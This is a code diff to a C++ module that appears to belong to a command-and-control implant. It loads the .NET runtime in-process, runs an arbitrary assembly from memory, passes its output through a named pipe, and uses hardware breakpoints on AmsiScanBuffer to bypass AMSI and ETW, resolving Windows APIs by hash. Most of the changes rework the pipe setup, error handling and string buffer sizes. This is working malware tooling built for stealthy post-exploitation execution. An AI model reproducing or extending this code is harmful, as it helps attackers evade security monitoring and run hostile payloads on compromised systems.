@@ -127,12 +127,25 @@ auto DECLFN DotnetExec(
     }
 
     if ( Instance->Ctx.ExecMethod == KH_METHOD_FORK ) {
-        Instance->Pipe.Write = Instance->Win32.CreateFileA(
-            Instance->Pipe.Name, GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr
+        SECURITY_ATTRIBUTES SecAttr = { 
+            .nLength = sizeof(SECURITY_ATTRIBUTES), 
+            .lpSecurityDescriptor = nullptr,
+            .bInheritHandle = TRUE
+        };
+
+        Instance->Pipe.Write = Instance->Win32.CreateNamedPipeA(
+            Instance->Pipe.Name, PIPE_ACCESS_DUPLEX,
+            PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
+            1, PIPE_BUFFER_LENGTH, PIPE_BUFFER_LENGTH, 0, &SecAttr
         );
-        
+
         if ( Instance->Pipe.Write == INVALID_HANDLE_VALUE ) {
-            HResult = NtCurrentTeb()->LastErrorValue;
+            DWORD err = NtCurrentTeb()->LastErrorValue;
+            return DotnetCleanup();
+        }
+
+        if ( ! Instance->Win32.ConnectNamedPipe( Instance->Pipe.Write, nullptr ) && NtCurrentTeb()->LastErrorValue != ERROR_PIPE_CONNECTED) {
+            DWORD err = NtCurrentTeb()->LastErrorValue;
             return DotnetCleanup();
         }
 
@@ -143,11 +156,10 @@ auto DECLFN DotnetExec(
     HResult = Instance->Win32.CLRCreateInstance( 
         xCLSID.CLRMetaHost, xIID.ICLRMetaHost, (PVOID*)&MetaHost 
     );
-    if ( HResult || !MetaHost ) return DotnetCleanup();
+    if ( HResult || !MetaHost ) {
+        return DotnetCleanup();
+    }
 
-    //
-    //  get the last version if parameters is not passed
-    //
     if ( ( Str::CompareW( Version, L"v0.0.00000" ) == 0 ) ) {
         HResult = MetaHost->EnumerateInstalledRuntimes( &EnumUkwn );
         if ( FAILED( HResult ) ) return DotnetCleanup();
@@ -165,73 +177,68 @@ auto DECLFN DotnetExec(
     }
 
     HResult = MetaHost->GetRuntime( Version, xIID.ICLRRuntimeInfo, (PVOID*)&RtmInfo );
-    if ( FAILED( HResult ) ) return DotnetCleanup();
+    if ( FAILED( HResult ) ) {
+        return DotnetCleanup();
+    }
 
-    //
-    // check if runtime is loadable
-    //
     HResult = RtmInfo->IsLoadable( &IsLoadable );
-    if ( HResult || !IsLoadable ) return DotnetCleanup();
+    if ( HResult || !IsLoadable ) {
+        return DotnetCleanup();
+    }
 
-    //
-    // load clr version
-    //
     HResult = RtmInfo->GetInterface( 
         xCLSID.CorRuntimeHost, xIID.ICorRuntimeHost, (PVOID*)&RtmHost 
     );
-    if ( FAILED( HResult ) ) return DotnetCleanup();
+    if ( FAILED( HResult ) ) {
+        return DotnetCleanup();
+    }
 
-    //
-    // start the clr loaded
-    //
     HResult = RtmHost->Start();
-    if ( FAILED( HResult ) ) return DotnetCleanup();
+    if ( FAILED( HResult ) ) {
+        return DotnetCleanup();
+    }
 
-    //
-    // create the app domain
-    //
-    HResult = RtmHost->CreateDomain( AppDomName, 0, &AppDomThunk );
-    if ( FAILED( HResult ) ) return DotnetCleanup();
+    if (!RtmHost) {
+        return DotnetCleanup();
+    }
+    
+    if (!AppDomName) {
+        return DotnetCleanup();
+    }
+    
+
+    HResult = RtmHost->GetDefaultDomain( &AppDomThunk );
+    if ( FAILED( HResult ) ) {
+        return DotnetCleanup();
+    }
 
     HResult = AppDomThunk->QueryInterface( xIID.AppDomain, (PVOID*)&AppDom );
-    if ( FAILED( HResult ) ) return DotnetCleanup();
+    if ( FAILED( HResult ) ) {
+        return DotnetCleanup();
+    }
 
     SafeBound = { AsmLength, 0 };
     SafeAsm   = Instance->Win32.SafeArrayCreate( VT_UI1, 1, &SafeBound );
 
-    //
-    // copy the dotnet assembly to safe array
-    //
     Mem::Copy( SafeAsm->pvData, AsmBytes, AsmLength );
 
-    //
-    // active hwbp to bypass amsi/etw
-    //
     if ( Instance->Ctx.Bypass ) {
         Hwbp::DotnetInit( Instance->Ctx.Bypass );
     }
 
-    //
-    // load the dotnet
-    //
     HResult = AppDom->Load_3( SafeAsm, &Assembly );
-    if ( FAILED( HResult ) ) return DotnetCleanup();
+    if ( FAILED( HResult ) ) {
+        return DotnetCleanup();
+    }
 
-    //
-    // get the entry point
-    //
     HResult = Assembly->get_EntryPoint( &MethodInfo );
-    if ( FAILED( HResult ) ) return DotnetCleanup();
+    if ( FAILED( HResult ) ) {
+        return DotnetCleanup();
+    }
 
-    //
-    // get the parameters requirements
-    //
     HResult = MethodInfo->GetParameters( &SafeExpc );
     if ( FAILED( HResult ) ) return DotnetCleanup();
 
-    //
-    // work with parameters requirements and do it
-    //
 	if ( SafeExpc ) {
 		if ( SafeExpc->cDims && SafeExpc->rgsabound[0].cElements ) {
 			SafeArgs = Instance->Win32.SafeArrayCreateVector( VT_VARIANT, 0, 1 );
@@ -255,9 +262,6 @@ auto DECLFN DotnetExec(
 		}
 	}
 
-    //
-    // set the console
-    //
     WinHandle = Instance->Win32.GetConsoleWindow();
 
     if ( ! WinHandle ) {
@@ -273,8 +277,10 @@ auto DECLFN DotnetExec(
         if ( Instance->Ctx.ExecMethod == KH_METHOD_INLINE ) {
             Instance->Win32.SetStdHandle( STD_OUTPUT_HANDLE, BckpStdout );
             Instance->Win32.SetStdHandle( STD_ERROR_HANDLE, BckpStdout  );
-            
-            Instance->Win32.DbgPrint("Console redirected to existing pipe");
+        } else if ( Instance->Ctx.ExecMethod == KH_METHOD_FORK ) {
+            // Re-redirect stdout to pipe after console allocation
+            Instance->Win32.SetStdHandle( STD_OUTPUT_HANDLE, Instance->Pipe.Write );
+            Instance->Win32.SetStdHandle( STD_ERROR_HANDLE, Instance->Pipe.Write );
         }
 
         AlrdyCon = FALSE;
@@ -284,7 +290,9 @@ auto DECLFN DotnetExec(
     // invoke/execute the dotnet assembly
     //
     HResult = MethodInfo->Invoke_3( VARIANT(), SafeArgs, nullptr );
-    if ( FAILED( HResult ) ) return DotnetCleanup();
+    if ( FAILED( HResult ) ) {
+        return DotnetCleanup();
+    }
 
     //
     // desactive hwbp to bypass amsi/etw
@@ -299,7 +307,6 @@ auto DECLFN DotnetExec(
         }
 
         Instance->Win32.FlushFileBuffers( Instance->Pipe.Write );
-        Instance->Win32.NtClose( Instance->Pipe.Write );
         Instance->Win32.SetStdHandle( STD_OUTPUT_HANDLE, BackupPp );
     }
 
@@ -398,6 +405,7 @@ auto DECLFN LoadAdds( INSTANCE* Instance ) -> VOID {
     Instance->Win32.CommandLineToArgvW = (decltype(Instance->Win32.CommandLineToArgvW))LoadApi(Shell32, HashStr("CommandLineToArgvW"));
 
     Instance->Hwbp.AmsiScanBuffer = (PVOID)LoadApi(Amsi, HashStr("AmsiScanBuffer"));
+
 }
 
 EXTERN_C
@@ -423,18 +431,25 @@ auto DECLFN Entry( PVOID Parameter ) -> VOID {
 
     ULONG Length    = 0;
     BYTE* Buffer    = Parser::Bytes( &Psr, &Length );
+    
+ 
     CHAR* Arguments = Parser::Str( &Psr );
+    
     CHAR* AppDomain = Parser::Str( &Psr );
+    
     CHAR* FmVersion = Parser::Str( &Psr );
+    
     ULONG KeepLoad  = Parser::Int32( &Psr );
-
-    ULONG AppDomainL = Str::LengthA( AppDomain ) * sizeof( WCHAR );
-    ULONG VersionL   = Str::LengthA( FmVersion ) * sizeof( WCHAR );
-    ULONG ArgumentsL = Str::LengthA( Arguments ) * sizeof( WCHAR );
+    
+ 
+    ULONG AppDomainL = (Str::LengthA( AppDomain ) + 1) * sizeof( WCHAR );
+    ULONG VersionL   = (Str::LengthA( FmVersion ) + 1) * sizeof( WCHAR );
+    ULONG ArgumentsL = (Str::LengthA( Arguments ) + 1) * sizeof( WCHAR );
 
     Instance.Ctx.KeepLoad = KeepLoad;
 
     LoadAdds( &Instance );
+    
 
     WCHAR* wArguments  = Heap::Alloc<WCHAR*>( ArgumentsL );
     WCHAR* wVersion    = Heap::Alloc<WCHAR*>( VersionL );
@@ -443,7 +458,7 @@ auto DECLFN Entry( PVOID Parameter ) -> VOID {
     Str::CharToWChar( wArguments, Arguments, ArgumentsL );
     Str::CharToWChar( wVersion, FmVersion, VersionL );
     Str::CharToWChar( wAppDomName, AppDomain, AppDomainL );
-
+    
     Result = DotnetExec( Buffer, Length, wArguments, wAppDomName, wVersion );
 
     Parser::Destroy( &Psr );
